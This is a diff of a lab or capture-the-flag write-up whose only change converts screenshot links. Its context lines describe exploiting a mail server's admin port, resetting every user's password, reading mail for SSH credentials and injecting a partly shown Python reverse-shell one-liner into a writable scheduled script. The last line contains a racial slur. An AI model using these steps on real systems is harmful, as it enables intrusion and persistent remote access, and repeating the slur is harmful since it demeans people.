@@ -41,8 +41,8 @@ Nmap done: 1 IP address (1 host up) scanned in 309.20 seconds
 petential RCE from edb
 
 
-tryna enum from port 4555![[Screenshot 2024-09-11 at 12.56.11 PM.png]]
-![[Screenshot 2024-09-11 at 12.55.44 PM.png]]
+tryna enum from port 4555![Image](/assets/Screenshot 2024-09-11 at 12.56.11 PM.png)
+![Image](/assets/Screenshot 2024-09-11 at 12.55.44 PM.png)
 
 set up python script and listener (dont forget to wrap like i did :P)
 
@@ -125,19 +125,19 @@ except:
 ```
 
 netcat into box and change passwords of all users to `password`
-![[Screenshot 2024-09-11 at 1.38.31 PM.png]]
+![Image](/assets/Screenshot 2024-09-11 at 1.38.31 PM.png)
 
-Now, we need to telnet into the mail server via pop3 on port 110. ![[Screenshot 2024-09-11 at 1.39.52 PM.png]] 
+Now, we need to telnet into the mail server via pop3 on port 110. ![Image](/assets/Screenshot 2024-09-11 at 1.39.52 PM.png) 
 
 `USER mindy` then type '`PASS password`'
 
 we can poke around these user's emails using `LIST` and `RETR`
-ssh creds ![[Screenshot 2024-09-11 at 1.41.52 PM.png]]
+ssh creds ![Image](/assets/Screenshot 2024-09-11 at 1.41.52 PM.png)
 
 Once we log in, our script from earlier triggers our listener!
-![[Screenshot 2024-09-11 at 1.43.23 PM.png]]
+![Image](/assets/Screenshot 2024-09-11 at 1.43.23 PM.png)
 
-![[Screenshot 2024-09-11 at 1.44.01 PM.png]]
+![Image](/assets/Screenshot 2024-09-11 at 1.44.01 PM.png)
 `USER:c2a02b6aac5efe90cc11717f43994eaa`
 
 serve linpeas 
@@ -149,7 +149,7 @@ both didnt work
 
 talk about opt and other common to check like /srv/ and /dev/
 
-![[Screenshot 2024-09-11 at 2.07.06 PM.png]]
+![Image](/assets/Screenshot 2024-09-11 at 2.07.06 PM.png)
 
 we see py script with read and write all perms
 
@@ -162,7 +162,7 @@ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 
 wait a few mins with wrapped listener
 
-![[Screenshot 2024-09-11 at 2.15.11 PM.png]]
+![Image](/assets/Screenshot 2024-09-11 at 2.15.11 PM.png)
 
 boom niga
 
